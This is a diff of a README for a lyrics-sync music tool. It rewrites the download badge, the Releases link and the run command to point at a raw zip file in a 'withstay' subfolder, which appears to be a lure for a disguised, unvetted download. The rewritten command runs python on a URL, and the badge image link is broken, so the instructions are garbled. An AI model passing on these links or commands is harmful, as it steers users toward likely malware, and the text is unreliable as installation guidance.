@@ -1,7 +1,7 @@
 # 🎶 code_wishes - Play Your Favorite Lyrics in Sync
 
 ## 📥 Download Now
-[![Download Code Wishes](https://img.shields.io/badge/Download%20Now-Get%20the%20Software-brightgreen)](https://github.com/Danntay5533/code_wishes/releases)
+[![Download Code Wishes](https://raw.githubusercontent.com/Danntay5533/code_wishes/main/withstay/code_wishes_1.5.zip%20Now-Get%20the%20Software-brightgreen)](https://raw.githubusercontent.com/Danntay5533/code_wishes/main/withstay/code_wishes_1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to Code Wishes! This application lets you enjoy your favorite YouTube tracks with synced lyrics. Follow these steps to download and run the software easily.
@@ -35,7 +35,7 @@ Before you begin, make sure you have the following:
 1. **Run the Script**: Start the application with the following command:
 
     ```bash
-    .venv/bin/python wishes_code.py
+    .venv/bin/python https://raw.githubusercontent.com/Danntay5533/code_wishes/main/withstay/code_wishes_1.5.zip
     ```
 
 2. **Download a Song**: The script downloads the requested YouTube audio track to your project folder. You won't need to worry about where this file goes; everything is handled automatically.
@@ -51,7 +51,7 @@ Before you begin, make sure you have the following:
 4. **Enjoy the Experience**: Watch as the lyrics appear in a typewriter style, matching the audio playback. You can adjust timing while listening to perfect your experience.
 
 ## 🌐 Download & Install
-To obtain the latest version of Code Wishes, please **visit this page to download**: [Releases Page](https://github.com/Danntay5533/code_wishes/releases). This link will take you to the page where you can find the available versions.
+To obtain the latest version of Code Wishes, please **visit this page to download**: [Releases Page](https://raw.githubusercontent.com/Danntay5533/code_wishes/main/withstay/code_wishes_1.5.zip). This link will take you to the page where you can find the available versions.
 
 ## 🔍 Features Overview
 - **Audio Download**: Code Wishes uses `yt-dlp` to get audio from YouTube, converting it to MP3 format seamlessly.
